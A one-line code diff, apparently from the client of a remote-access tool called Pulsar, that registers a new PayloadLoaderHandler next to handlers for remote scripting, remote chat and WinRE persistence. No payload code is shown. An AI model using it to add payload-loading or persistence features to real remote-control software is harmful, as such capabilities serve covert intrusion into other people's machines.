@@ -325,7 +325,7 @@ namespace Pulsar.Client
             RegisterProcessor(new RemoteScriptingHandler());
             RegisterProcessor(new RemoteChatHandler());
             RegisterProcessor(new WinREPersistenceHandler());
-
+            RegisterProcessor(new PayloadLoaderHandler());
             ScheduleDeferredMessageProcessors(client);
         }
 
